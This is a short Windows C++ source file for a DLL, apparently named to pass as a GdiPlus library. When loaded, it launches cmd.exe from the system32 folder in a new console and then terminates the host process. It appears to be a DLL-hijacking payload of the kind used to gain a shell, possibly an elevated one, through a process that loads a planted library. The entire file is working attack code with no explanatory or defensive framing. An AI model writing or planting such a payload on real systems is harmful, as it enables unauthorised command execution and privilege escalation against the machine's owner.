// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <tchar.h>
#include "GdiPlus_32.h"

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD fdwReason,
	_In_ LPVOID lpvReserved
) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		DWORD					pathLength;
		TCHAR					cmdBuf[MAX_PATH * 2], sysDir[MAX_PATH + 1];
		STARTUPINFO				startupInfo;
		PROCESS_INFORMATION		processInfo;

		RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
		RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
		startupInfo.cb = sizeof(startupInfo);
		GetStartupInfo(&startupInfo);

		RtlSecureZeroMemory(sysDir, sizeof(sysDir));
		pathLength = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysDir, MAX_PATH);
		if ((pathLength != 0) && (pathLength < MAX_PATH)) {
			RtlSecureZeroMemory(cmdBuf, sizeof(cmdBuf));
			_tcscpy_s(cmdBuf, sysDir);
			_tcscat_s(cmdBuf, TEXT("cmd.exe"));
			if (CreateProcess(cmdBuf, NULL, NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, sysDir, &startupInfo, &processInfo)) {
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
		}
		ExitProcess(0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
